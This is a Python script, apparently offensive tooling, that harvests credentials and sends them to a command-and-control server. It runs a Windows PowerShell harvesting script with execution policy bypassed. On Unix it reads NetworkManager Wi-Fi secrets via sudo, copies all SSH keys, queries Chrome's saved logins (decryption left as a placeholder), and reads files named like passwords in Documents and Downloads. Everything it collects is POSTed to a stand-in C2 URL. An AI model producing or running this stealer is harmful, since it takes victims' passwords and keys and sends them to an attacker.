######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import subprocess
import sqlite3
import json
import requests

C2_SERVER_URL = "http://C2_IP_or_URL/receive_credentials"

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        script_path = os.path.join(os.path.dirname(__file__), 'windows', 'credential_harvesting.ps1')
        result = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path], capture_output=True, text=True)
        credentials.append(result.stdout.strip())
    elif os.name == 'posix':
        credentials.extend(harvest_unix_wifi_passwords())
        credentials.extend(harvest_ssh_keys())
        credentials.extend(harvest_unix_browser_passwords())
        credentials.extend(harvest_unix_local_files())

    return credentials

def harvest_unix_wifi_passwords():
    credentials = []
    command = "sudo cat /etc/NetworkManager/system-connections/*"
    try:
        result = subprocess.check_output(command, shell=True).decode().strip()
        credentials.append(result)
    except subprocess.CalledProcessError as e:
        credentials.append(f"Failed to extract Wi-Fi passwords: {e}")
    return credentials

def harvest_ssh_keys():
    credentials = []
    ssh_keys_path = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_keys_path):
        for file in os.listdir(ssh_keys_path):
            with open(os.path.join(ssh_keys_path, file), 'r') as f:
                credentials.append(f.read().strip())
    return credentials

def harvest_unix_browser_passwords():
    credentials = []
    try:
        login_data_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_linux_password(encrypted_password)
            credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
    except Exception as e:
        credentials.append(f"Failed to extract browser passwords: {e}")
    return credentials

def decrypt_linux_password(encrypted_password):
    # Add the decryption logic here
    return "decrypted_password_placeholder"

def harvest_unix_local_files():
    credentials = []
    directories_to_search = [
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads")
    ]
    for directory in directories_to_search:
        for root, _, files in os.walk(directory):
            for file in files:
                if 'password' in file.lower():
                    with open(os.path.join(root, file), 'r') as f:
                        credentials.append(f.read().strip())
    return credentials

def send_to_c2_server(data):
    try:
        response = requests.post(C2_SERVER_URL, json={"data": data})
        if response.status_code == 200:
            print("Data successfully sent to C2 server.")
        else:
            print(f"Failed to send data to C2 server. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to C2 server: {e}")

if __name__ == "__main__":
    creds = harvest_credentials()
    for cred in creds:
        print(cred)
    send_to_c2_server(creds)

